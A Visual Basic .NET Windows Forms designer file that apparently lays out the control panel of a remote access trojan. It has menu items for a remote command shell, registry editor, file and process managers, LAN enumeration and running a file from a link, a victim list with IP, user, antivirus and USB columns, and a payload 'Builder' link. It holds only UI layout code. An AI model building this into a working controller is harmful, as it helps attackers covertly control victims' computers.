<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.StatusStrip1 = New System.Windows.Forms.StatusStrip()
        Me.ToolStripStatusLabel1 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel3 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ToolStripStatusLabel2 = New System.Windows.Forms.ToolStripStatusLabel()
        Me.ContextMenuStrip1 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.RegeditToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CmdShellToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FileManagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.LANEnumeriationToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.VIRUSToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ProcessManagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MsgBoxToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.AboutToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoveToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ii = New System.Windows.Forms.ImageList(Me.components)
        Me.Timer2 = New System.Windows.Forms.Timer(Me.components)
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.L1 = New System.Windows.Forms.ListView()
        Me.ColumnHeader1 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader2 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader3 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader4 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader10 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader11 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader12 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader13 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader14 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader15 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.Lv1 = New System.Windows.Forms.ListView()
        Me.StatusStrip1.SuspendLayout()
        Me.ContextMenuStrip1.SuspendLayout()
        Me.SuspendLayout()
        '
        'StatusStrip1
        '
        Me.StatusStrip1.BackColor = System.Drawing.Color.WhiteSmoke
        Me.StatusStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripStatusLabel1, Me.ToolStripStatusLabel3, Me.ToolStripStatusLabel2})
        Me.StatusStrip1.Location = New System.Drawing.Point(0, 273)
        Me.StatusStrip1.Name = "StatusStrip1"
        Me.StatusStrip1.Size = New System.Drawing.Size(923, 22)
        Me.StatusStrip1.TabIndex = 3
        Me.StatusStrip1.Text = "StatusStrip1"
        '
        'ToolStripStatusLabel1
        '
        Me.ToolStripStatusLabel1.ActiveLinkColor = System.Drawing.Color.Teal
        Me.ToolStripStatusLabel1.DoubleClickEnabled = True
        Me.ToolStripStatusLabel1.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ToolStripStatusLabel1.ForeColor = System.Drawing.Color.Black
        Me.ToolStripStatusLabel1.IsLink = True
        Me.ToolStripStatusLabel1.LinkBehavior = System.Windows.Forms.LinkBehavior.NeverUnderline
        Me.ToolStripStatusLabel1.LinkVisited = True
        Me.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1"
        Me.ToolStripStatusLabel1.Size = New System.Drawing.Size(46, 17)
        Me.ToolStripStatusLabel1.Text = "[ Logs ]"
        Me.ToolStripStatusLabel1.VisitedLinkColor = System.Drawing.Color.Black
        '
        'ToolStripStatusLabel3
        '
        Me.ToolStripStatusLabel3.ActiveLinkColor = System.Drawing.Color.Teal
        Me.ToolStripStatusLabel3.DoubleClickEnabled = True
        Me.ToolStripStatusLabel3.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ToolStripStatusLabel3.ForeColor = System.Drawing.Color.Black
        Me.ToolStripStatusLabel3.IsLink = True
        Me.ToolStripStatusLabel3.LinkBehavior = System.Windows.Forms.LinkBehavior.NeverUnderline
        Me.ToolStripStatusLabel3.LinkVisited = True
        Me.ToolStripStatusLabel3.Name = "ToolStripStatusLabel3"
        Me.ToolStripStatusLabel3.Size = New System.Drawing.Size(58, 17)
        Me.ToolStripStatusLabel3.Text = "[ Builder ]"
        Me.ToolStripStatusLabel3.VisitedLinkColor = System.Drawing.Color.Black
        '
        'ToolStripStatusLabel2
        '
        Me.ToolStripStatusLabel2.ActiveLinkColor = System.Drawing.Color.Teal
        Me.ToolStripStatusLabel2.DoubleClickEnabled = True
        Me.ToolStripStatusLabel2.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ToolStripStatusLabel2.ForeColor = System.Drawing.Color.Black
        Me.ToolStripStatusLabel2.IsLink = True
        Me.ToolStripStatusLabel2.LinkBehavior = System.Windows.Forms.LinkBehavior.NeverUnderline
        Me.ToolStripStatusLabel2.LinkVisited = True
        Me.ToolStripStatusLabel2.Name = "ToolStripStatusLabel2"
        Me.ToolStripStatusLabel2.Size = New System.Drawing.Size(54, 17)
        Me.ToolStripStatusLabel2.Text = "[ About ]"
        Me.ToolStripStatusLabel2.VisitedLinkColor = System.Drawing.Color.Black
        '
        'ContextMenuStrip1
        '
        Me.ContextMenuStrip1.BackColor = System.Drawing.Color.White
        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RegeditToolStripMenuItem, Me.CmdShellToolStripMenuItem, Me.FileManagerToolStripMenuItem, Me.LANEnumeriationToolStripMenuItem, Me.VIRUSToolStripMenuItem, Me.ProcessManagerToolStripMenuItem, Me.MsgBoxToolStripMenuItem, Me.AboutToolStripMenuItem, Me.RemoveToolStripMenuItem})
        Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
        Me.ContextMenuStrip1.RenderMode = System.Windows.Forms.ToolStripRenderMode.Professional
        Me.ContextMenuStrip1.Size = New System.Drawing.Size(232, 202)
        '
        'RegeditToolStripMenuItem
        '
        Me.RegeditToolStripMenuItem.BackColor = System.Drawing.Color.WhiteSmoke
        Me.RegeditToolStripMenuItem.Font = New System.Drawing.Font("Segoe UI", 9.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.RegeditToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.RegeditToolStripMenuItem.Image = CType(resources.GetObject("RegeditToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RegeditToolStripMenuItem.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.RegeditToolStripMenuItem.Name = "RegeditToolStripMenuItem"
        Me.RegeditToolStripMenuItem.Size = New System.Drawing.Size(231, 22)
        Me.RegeditToolStripMenuItem.Text = "Remote Regedit Manager"
        '
        'CmdShellToolStripMenuItem
        '
        Me.CmdShellToolStripMenuItem.BackColor = System.Drawing.Color.WhiteSmoke
        Me.CmdShellToolStripMenuItem.Font = New System.Drawing.Font("Segoe UI", 9.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.CmdShellToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.CmdShellToolStripMenuItem.Image = CType(resources.GetObject("CmdShellToolStripMenuItem.Image"), System.Drawing.Image)
        Me.CmdShellToolStripMenuItem.Name = "CmdShellToolStripMenuItem"
        Me.CmdShellToolStripMenuItem.Size = New System.Drawing.Size(231, 22)
        Me.CmdShellToolStripMenuItem.Text = "Remote Cmd Shell"
        '
        'FileManagerToolStripMenuItem
        '
        Me.FileManagerToolStripMenuItem.BackColor = System.Drawing.Color.WhiteSmoke
        Me.FileManagerToolStripMenuItem.Font = New System.Drawing.Font("Segoe UI", 9.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.FileManagerToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.FileManagerToolStripMenuItem.Image = CType(resources.GetObject("FileManagerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.FileManagerToolStripMenuItem.Name = "FileManagerToolStripMenuItem"
        Me.FileManagerToolStripMenuItem.Size = New System.Drawing.Size(231, 22)
        Me.FileManagerToolStripMenuItem.Text = "Remote File Manager"
        '
        'LANEnumeriationToolStripMenuItem
        '
        Me.LANEnumeriationToolStripMenuItem.BackColor = System.Drawing.Color.WhiteSmoke
        Me.LANEnumeriationToolStripMenuItem.Font = New System.Drawing.Font("Segoe UI", 9.75!, System.Drawing.FontStyle.Bold)
        Me.LANEnumeriationToolStripMenuItem.Image = CType(resources.GetObject("LANEnumeriationToolStripMenuItem.Image"), System.Drawing.Image)
        Me.LANEnumeriationToolStripMenuItem.Name = "LANEnumeriationToolStripMenuItem"
        Me.LANEnumeriationToolStripMenuItem.Size = New System.Drawing.Size(231, 22)
        Me.LANEnumeriationToolStripMenuItem.Text = "LAN Enumeration"
        '
        'VIRUSToolStripMenuItem
        '
        Me.VIRUSToolStripMenuItem.BackColor = System.Drawing.Color.WhiteSmoke
        Me.VIRUSToolStripMenuItem.Font = New System.Drawing.Font("Segoe UI", 9.75!, System.Drawing.FontStyle.Bold)
        Me.VIRUSToolStripMenuItem.Image = CType(resources.GetObject("VIRUSToolStripMenuItem.Image"), System.Drawing.Image)
        Me.VIRUSToolStripMenuItem.Name = "VIRUSToolStripMenuItem"
        Me.VIRUSToolStripMenuItem.Size = New System.Drawing.Size(231, 22)
        Me.VIRUSToolStripMenuItem.Text = "Remote SQL Commander"
        '
        'ProcessManagerToolStripMenuItem
        '
        Me.ProcessManagerToolStripMenuItem.BackColor = System.Drawing.Color.WhiteSmoke
        Me.ProcessManagerToolStripMenuItem.Font = New System.Drawing.Font("Segoe UI", 9.75!, System.Drawing.FontStyle.Bold)
        Me.ProcessManagerToolStripMenuItem.Image = CType(resources.GetObject("ProcessManagerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ProcessManagerToolStripMenuItem.Name = "ProcessManagerToolStripMenuItem"
        Me.ProcessManagerToolStripMenuItem.Size = New System.Drawing.Size(231, 22)
        Me.ProcessManagerToolStripMenuItem.Text = "Remote Process Manager"
        '
        'MsgBoxToolStripMenuItem
        '
        Me.MsgBoxToolStripMenuItem.BackColor = System.Drawing.Color.WhiteSmoke
        Me.MsgBoxToolStripMenuItem.Font = New System.Drawing.Font("Segoe UI", 9.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.MsgBoxToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.MsgBoxToolStripMenuItem.Image = CType(resources.GetObject("MsgBoxToolStripMenuItem.Image"), System.Drawing.Image)
        Me.MsgBoxToolStripMenuItem.Name = "MsgBoxToolStripMenuItem"
        Me.MsgBoxToolStripMenuItem.Size = New System.Drawing.Size(231, 22)
        Me.MsgBoxToolStripMenuItem.Text = "Send Message"
        '
        'AboutToolStripMenuItem
        '
        Me.AboutToolStripMenuItem.BackColor = System.Drawing.Color.WhiteSmoke
        Me.AboutToolStripMenuItem.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom
        Me.AboutToolStripMenuItem.Font = New System.Drawing.Font("Segoe UI", 9.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.AboutToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.AboutToolStripMenuItem.Image = CType(resources.GetObject("AboutToolStripMenuItem.Image"), System.Drawing.Image)
        Me.AboutToolStripMenuItem.Name = "AboutToolStripMenuItem"
        Me.AboutToolStripMenuItem.Size = New System.Drawing.Size(231, 22)
        Me.AboutToolStripMenuItem.Text = "Run file From Link"
        '
        'RemoveToolStripMenuItem
        '
        Me.RemoveToolStripMenuItem.BackColor = System.Drawing.Color.WhiteSmoke
        Me.RemoveToolStripMenuItem.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom
        Me.RemoveToolStripMenuItem.Font = New System.Drawing.Font("Segoe UI", 9.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.RemoveToolStripMenuItem.ForeColor = System.Drawing.Color.Black
        Me.RemoveToolStripMenuItem.Image = CType(resources.GetObject("RemoveToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RemoveToolStripMenuItem.Name = "RemoveToolStripMenuItem"
        Me.RemoveToolStripMenuItem.Size = New System.Drawing.Size(231, 22)
        Me.RemoveToolStripMenuItem.Text = "Uninstall"
        '
        'ii
        '
        Me.ii.ImageStream = CType(resources.GetObject("ii.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.ii.TransparentColor = System.Drawing.Color.Transparent
        Me.ii.Images.SetKeyName(0, "F15-Sniper.png")
        Me.ii.Images.SetKeyName(1, "1.gif")
        Me.ii.Images.SetKeyName(2, "2.gif")
        Me.ii.Images.SetKeyName(3, "3.gif")
        Me.ii.Images.SetKeyName(4, "4.gif")
        Me.ii.Images.SetKeyName(5, "5.gif")
        Me.ii.Images.SetKeyName(6, "6.gif")
        Me.ii.Images.SetKeyName(7, "7.gif")
        Me.ii.Images.SetKeyName(8, "8.gif")
        Me.ii.Images.SetKeyName(9, "9.gif")
        Me.ii.Images.SetKeyName(10, "10.gif")
        Me.ii.Images.SetKeyName(11, "11.gif")
        Me.ii.Images.SetKeyName(12, "12.gif")
        Me.ii.Images.SetKeyName(13, "13.gif")
        Me.ii.Images.SetKeyName(14, "14.gif")
        Me.ii.Images.SetKeyName(15, "15.gif")
        Me.ii.Images.SetKeyName(16, "16.gif")
        Me.ii.Images.SetKeyName(17, "17.gif")
        Me.ii.Images.SetKeyName(18, "18.gif")
        Me.ii.Images.SetKeyName(19, "19.gif")
        Me.ii.Images.SetKeyName(20, "20.gif")
        Me.ii.Images.SetKeyName(21, "21.gif")
        Me.ii.Images.SetKeyName(22, "22.gif")
        Me.ii.Images.SetKeyName(23, "23.gif")
        Me.ii.Images.SetKeyName(24, "24.gif")
        Me.ii.Images.SetKeyName(25, "25.gif")
        Me.ii.Images.SetKeyName(26, "26.gif")
        Me.ii.Images.SetKeyName(27, "27.gif")
        Me.ii.Images.SetKeyName(28, "28.gif")
        Me.ii.Images.SetKeyName(29, "29.gif")
        Me.ii.Images.SetKeyName(30, "30.gif")
        Me.ii.Images.SetKeyName(31, "31.gif")
        Me.ii.Images.SetKeyName(32, "32.gif")
        Me.ii.Images.SetKeyName(33, "33.gif")
        Me.ii.Images.SetKeyName(34, "34.gif")
        Me.ii.Images.SetKeyName(35, "35.gif")
        Me.ii.Images.SetKeyName(36, "36.gif")
        Me.ii.Images.SetKeyName(37, "37.gif")
        Me.ii.Images.SetKeyName(38, "38.gif")
        Me.ii.Images.SetKeyName(39, "39.gif")
        Me.ii.Images.SetKeyName(40, "40.gif")
        Me.ii.Images.SetKeyName(41, "41.gif")
        Me.ii.Images.SetKeyName(42, "42.gif")
        Me.ii.Images.SetKeyName(43, "43.gif")
        Me.ii.Images.SetKeyName(44, "44.gif")
        Me.ii.Images.SetKeyName(45, "45.gif")
        Me.ii.Images.SetKeyName(46, "46.gif")
        Me.ii.Images.SetKeyName(47, "47.gif")
        Me.ii.Images.SetKeyName(48, "48.gif")
        Me.ii.Images.SetKeyName(49, "49.gif")
        Me.ii.Images.SetKeyName(50, "50.gif")
        Me.ii.Images.SetKeyName(51, "51.gif")
        Me.ii.Images.SetKeyName(52, "52.gif")
        Me.ii.Images.SetKeyName(53, "53.gif")
        Me.ii.Images.SetKeyName(54, "54.gif")
        Me.ii.Images.SetKeyName(55, "55.gif")
        Me.ii.Images.SetKeyName(56, "56.gif")
        Me.ii.Images.SetKeyName(57, "57.gif")
        Me.ii.Images.SetKeyName(58, "58.gif")
        Me.ii.Images.SetKeyName(59, "59.gif")
        Me.ii.Images.SetKeyName(60, "60.gif")
        Me.ii.Images.SetKeyName(61, "61.gif")
        Me.ii.Images.SetKeyName(62, "62.gif")
        Me.ii.Images.SetKeyName(63, "63.gif")
        Me.ii.Images.SetKeyName(64, "64.gif")
        Me.ii.Images.SetKeyName(65, "65.gif")
        Me.ii.Images.SetKeyName(66, "66.gif")
        Me.ii.Images.SetKeyName(67, "67.gif")
        Me.ii.Images.SetKeyName(68, "68.gif")
        Me.ii.Images.SetKeyName(69, "69.gif")
        Me.ii.Images.SetKeyName(70, "70.gif")
        Me.ii.Images.SetKeyName(71, "71.gif")
        Me.ii.Images.SetKeyName(72, "72.gif")
        Me.ii.Images.SetKeyName(73, "73.gif")
        Me.ii.Images.SetKeyName(74, "74.gif")
        Me.ii.Images.SetKeyName(75, "75.gif")
        Me.ii.Images.SetKeyName(76, "76.gif")
        Me.ii.Images.SetKeyName(77, "77.gif")
        Me.ii.Images.SetKeyName(78, "78.gif")
        Me.ii.Images.SetKeyName(79, "79.gif")
        Me.ii.Images.SetKeyName(80, "80.gif")
        Me.ii.Images.SetKeyName(81, "81.gif")
        Me.ii.Images.SetKeyName(82, "82.gif")
        Me.ii.Images.SetKeyName(83, "83.gif")
        Me.ii.Images.SetKeyName(84, "84.gif")
        Me.ii.Images.SetKeyName(85, "85.gif")
        Me.ii.Images.SetKeyName(86, "86.gif")
        Me.ii.Images.SetKeyName(87, "87.gif")
        Me.ii.Images.SetKeyName(88, "88.gif")
        Me.ii.Images.SetKeyName(89, "89.gif")
        Me.ii.Images.SetKeyName(90, "90.gif")
        Me.ii.Images.SetKeyName(91, "91.gif")
        Me.ii.Images.SetKeyName(92, "92.gif")
        Me.ii.Images.SetKeyName(93, "93.gif")
        Me.ii.Images.SetKeyName(94, "94.gif")
        Me.ii.Images.SetKeyName(95, "95.gif")
        Me.ii.Images.SetKeyName(96, "96.gif")
        Me.ii.Images.SetKeyName(97, "97.gif")
        Me.ii.Images.SetKeyName(98, "98.gif")
        Me.ii.Images.SetKeyName(99, "99.gif")
        Me.ii.Images.SetKeyName(100, "100.gif")
        Me.ii.Images.SetKeyName(101, "101.gif")
        Me.ii.Images.SetKeyName(102, "102.gif")
        Me.ii.Images.SetKeyName(103, "103.gif")
        Me.ii.Images.SetKeyName(104, "104.gif")
        Me.ii.Images.SetKeyName(105, "105.gif")
        Me.ii.Images.SetKeyName(106, "106.gif")
        Me.ii.Images.SetKeyName(107, "107.gif")
        Me.ii.Images.SetKeyName(108, "108.gif")
        Me.ii.Images.SetKeyName(109, "109.gif")
        Me.ii.Images.SetKeyName(110, "110.gif")
        Me.ii.Images.SetKeyName(111, "111.gif")
        Me.ii.Images.SetKeyName(112, "112.gif")
        Me.ii.Images.SetKeyName(113, "113.gif")
        Me.ii.Images.SetKeyName(114, "114.gif")
        Me.ii.Images.SetKeyName(115, "115.gif")
        Me.ii.Images.SetKeyName(116, "116.gif")
        Me.ii.Images.SetKeyName(117, "117.gif")
        Me.ii.Images.SetKeyName(118, "118.gif")
        Me.ii.Images.SetKeyName(119, "119.gif")
        Me.ii.Images.SetKeyName(120, "120.gif")
        Me.ii.Images.SetKeyName(121, "121.gif")
        Me.ii.Images.SetKeyName(122, "122.gif")
        Me.ii.Images.SetKeyName(123, "123.gif")
        Me.ii.Images.SetKeyName(124, "124.gif")
        Me.ii.Images.SetKeyName(125, "125.gif")
        Me.ii.Images.SetKeyName(126, "126.gif")
        Me.ii.Images.SetKeyName(127, "127.gif")
        Me.ii.Images.SetKeyName(128, "128.gif")
        Me.ii.Images.SetKeyName(129, "129.gif")
        Me.ii.Images.SetKeyName(130, "130.gif")
        Me.ii.Images.SetKeyName(131, "131.gif")
        Me.ii.Images.SetKeyName(132, "132.gif")
        Me.ii.Images.SetKeyName(133, "133.gif")
        Me.ii.Images.SetKeyName(134, "134.gif")
        Me.ii.Images.SetKeyName(135, "135.gif")
        Me.ii.Images.SetKeyName(136, "136.gif")
        Me.ii.Images.SetKeyName(137, "137.gif")
        Me.ii.Images.SetKeyName(138, "138.gif")
        Me.ii.Images.SetKeyName(139, "139.gif")
        Me.ii.Images.SetKeyName(140, "140.gif")
        Me.ii.Images.SetKeyName(141, "141.gif")
        Me.ii.Images.SetKeyName(142, "142.gif")
        Me.ii.Images.SetKeyName(143, "143.gif")
        Me.ii.Images.SetKeyName(144, "144.gif")
        Me.ii.Images.SetKeyName(145, "145.gif")
        Me.ii.Images.SetKeyName(146, "146.gif")
        Me.ii.Images.SetKeyName(147, "147.gif")
        Me.ii.Images.SetKeyName(148, "148.gif")
        Me.ii.Images.SetKeyName(149, "149.gif")
        Me.ii.Images.SetKeyName(150, "150.gif")
        Me.ii.Images.SetKeyName(151, "151.gif")
        Me.ii.Images.SetKeyName(152, "152.gif")
        Me.ii.Images.SetKeyName(153, "153.gif")
        Me.ii.Images.SetKeyName(154, "154.gif")
        Me.ii.Images.SetKeyName(155, "155.gif")
        Me.ii.Images.SetKeyName(156, "156.gif")
        Me.ii.Images.SetKeyName(157, "157.gif")
        Me.ii.Images.SetKeyName(158, "158.gif")
        Me.ii.Images.SetKeyName(159, "159.gif")
        Me.ii.Images.SetKeyName(160, "160.gif")
        Me.ii.Images.SetKeyName(161, "161.gif")
        Me.ii.Images.SetKeyName(162, "162.gif")
        Me.ii.Images.SetKeyName(163, "163.gif")
        Me.ii.Images.SetKeyName(164, "164.gif")
        Me.ii.Images.SetKeyName(165, "165.gif")
        Me.ii.Images.SetKeyName(166, "166.gif")
        Me.ii.Images.SetKeyName(167, "167.gif")
        Me.ii.Images.SetKeyName(168, "168.gif")
        Me.ii.Images.SetKeyName(169, "169.gif")
        Me.ii.Images.SetKeyName(170, "170.gif")
        Me.ii.Images.SetKeyName(171, "171.gif")
        Me.ii.Images.SetKeyName(172, "172.gif")
        Me.ii.Images.SetKeyName(173, "173.gif")
        Me.ii.Images.SetKeyName(174, "174.gif")
        Me.ii.Images.SetKeyName(175, "175.gif")
        Me.ii.Images.SetKeyName(176, "176.gif")
        Me.ii.Images.SetKeyName(177, "177.gif")
        Me.ii.Images.SetKeyName(178, "178.gif")
        Me.ii.Images.SetKeyName(179, "179.gif")
        Me.ii.Images.SetKeyName(180, "180.gif")
        Me.ii.Images.SetKeyName(181, "181.gif")
        Me.ii.Images.SetKeyName(182, "182.gif")
        Me.ii.Images.SetKeyName(183, "183.gif")
        Me.ii.Images.SetKeyName(184, "184.gif")
        Me.ii.Images.SetKeyName(185, "185.gif")
        Me.ii.Images.SetKeyName(186, "186.gif")
        Me.ii.Images.SetKeyName(187, "187.gif")
        Me.ii.Images.SetKeyName(188, "188.gif")
        Me.ii.Images.SetKeyName(189, "189.gif")
        Me.ii.Images.SetKeyName(190, "190.gif")
        Me.ii.Images.SetKeyName(191, "191.gif")
        Me.ii.Images.SetKeyName(192, "192.gif")
        Me.ii.Images.SetKeyName(193, "193.gif")
        Me.ii.Images.SetKeyName(194, "194.gif")
        Me.ii.Images.SetKeyName(195, "195.gif")
        Me.ii.Images.SetKeyName(196, "196.gif")
        Me.ii.Images.SetKeyName(197, "197.gif")
        Me.ii.Images.SetKeyName(198, "198.gif")
        Me.ii.Images.SetKeyName(199, "199.gif")
        Me.ii.Images.SetKeyName(200, "200.gif")
        Me.ii.Images.SetKeyName(201, "201.gif")
        Me.ii.Images.SetKeyName(202, "202.gif")
        Me.ii.Images.SetKeyName(203, "203.gif")
        Me.ii.Images.SetKeyName(204, "204.gif")
        Me.ii.Images.SetKeyName(205, "205.gif")
        Me.ii.Images.SetKeyName(206, "206.gif")
        Me.ii.Images.SetKeyName(207, "207.jpg")
        Me.ii.Images.SetKeyName(208, "208.gif")
        Me.ii.Images.SetKeyName(209, "209.gif")
        Me.ii.Images.SetKeyName(210, "210.gif")
        Me.ii.Images.SetKeyName(211, "211.gif")
        Me.ii.Images.SetKeyName(212, "212.gif")
        Me.ii.Images.SetKeyName(213, "213.gif")
        Me.ii.Images.SetKeyName(214, "214.gif")
        Me.ii.Images.SetKeyName(215, "215.gif")
        Me.ii.Images.SetKeyName(216, "216.gif")
        Me.ii.Images.SetKeyName(217, "217.gif")
        Me.ii.Images.SetKeyName(218, "218.gif")
        Me.ii.Images.SetKeyName(219, "219.gif")
        Me.ii.Images.SetKeyName(220, "220.gif")
        Me.ii.Images.SetKeyName(221, "221.gif")
        Me.ii.Images.SetKeyName(222, "222.gif")
        Me.ii.Images.SetKeyName(223, "223.gif")
        Me.ii.Images.SetKeyName(224, "224.gif")
        Me.ii.Images.SetKeyName(225, "225.gif")
        Me.ii.Images.SetKeyName(226, "226.gif")
        Me.ii.Images.SetKeyName(227, "227.gif")
        Me.ii.Images.SetKeyName(228, "228.gif")
        Me.ii.Images.SetKeyName(229, "229.gif")
        Me.ii.Images.SetKeyName(230, "230.gif")
        Me.ii.Images.SetKeyName(231, "231.gif")
        Me.ii.Images.SetKeyName(232, "232.gif")
        Me.ii.Images.SetKeyName(233, "233.gif")
        Me.ii.Images.SetKeyName(234, "234.gif")
        Me.ii.Images.SetKeyName(235, "235.gif")
        Me.ii.Images.SetKeyName(236, "236.gif")
        Me.ii.Images.SetKeyName(237, "237.gif")
        Me.ii.Images.SetKeyName(238, "238.gif")
        Me.ii.Images.SetKeyName(239, "239.gif")
        Me.ii.Images.SetKeyName(240, "240.gif")
        Me.ii.Images.SetKeyName(241, "241.gif")
        Me.ii.Images.SetKeyName(242, "basic.png")
        Me.ii.Images.SetKeyName(243, "connections.png")
        Me.ii.Images.SetKeyName(244, "group.png")
        Me.ii.Images.SetKeyName(245, "misc.png")
        Me.ii.Images.SetKeyName(246, "user.png")
        Me.ii.Images.SetKeyName(247, "user_gray.png")
        '
        'Timer2
        '
        Me.Timer2.Interval = 9000
        '
        'Timer1
        '
        Me.Timer1.Enabled = True
        Me.Timer1.Interval = 300
        '
        'L1
        '
        Me.L1.BackColor = System.Drawing.Color.WhiteSmoke
        Me.L1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.L1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader1, Me.ColumnHeader2, Me.ColumnHeader3, Me.ColumnHeader4, Me.ColumnHeader10, Me.ColumnHeader11, Me.ColumnHeader12, Me.ColumnHeader13, Me.ColumnHeader14, Me.ColumnHeader15})
        Me.L1.ContextMenuStrip = Me.ContextMenuStrip1
        Me.L1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.L1.Font = New System.Drawing.Font("Microsoft Sans Serif", 11.25!, System.Drawing.FontStyle.Bold)
        Me.L1.ForeColor = System.Drawing.Color.Black
        Me.L1.FullRowSelect = True
        Me.L1.LargeImageList = Me.ii
        Me.L1.Location = New System.Drawing.Point(0, 0)
        Me.L1.Name = "L1"
        Me.L1.Size = New System.Drawing.Size(923, 273)
        Me.L1.SmallImageList = Me.ii
        Me.L1.TabIndex = 5
        Me.L1.UseCompatibleStateImageBehavior = False
        Me.L1.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader1
        '
        Me.ColumnHeader1.Text = "ID"
        Me.ColumnHeader1.Width = 90
        '
        'ColumnHeader2
        '
        Me.ColumnHeader2.Text = "IP"
        Me.ColumnHeader2.Width = 120
        '
        'ColumnHeader3
        '
        Me.ColumnHeader3.Text = "PC"
        Me.ColumnHeader3.Width = 100
        '
        'ColumnHeader4
        '
        Me.ColumnHeader4.Text = "USER"
        Me.ColumnHeader4.Width = 70
        '
        'ColumnHeader10
        '
        Me.ColumnHeader10.Text = "OS"
        Me.ColumnHeader10.Width = 100
        '
        'ColumnHeader11
        '
        Me.ColumnHeader11.Text = "Country"
        Me.ColumnHeader11.Width = 100
        '
        'ColumnHeader12
        '
        Me.ColumnHeader12.Text = "Ver."
        '
        'ColumnHeader13
        '
        Me.ColumnHeader13.Text = "Antivirus"
        Me.ColumnHeader13.Width = 100
        '
        'ColumnHeader14
        '
        Me.ColumnHeader14.Text = "USB"
        '
        'ColumnHeader15
        '
        Me.ColumnHeader15.Text = "Status"
        '
        'Lv1
        '
        Me.Lv1.BackColor = System.Drawing.Color.Maroon
        Me.Lv1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Lv1.Location = New System.Drawing.Point(0, 0)
        Me.Lv1.Name = "Lv1"
        Me.Lv1.Size = New System.Drawing.Size(923, 295)
        Me.Lv1.TabIndex = 6
        Me.Lv1.UseCompatibleStateImageBehavior = False
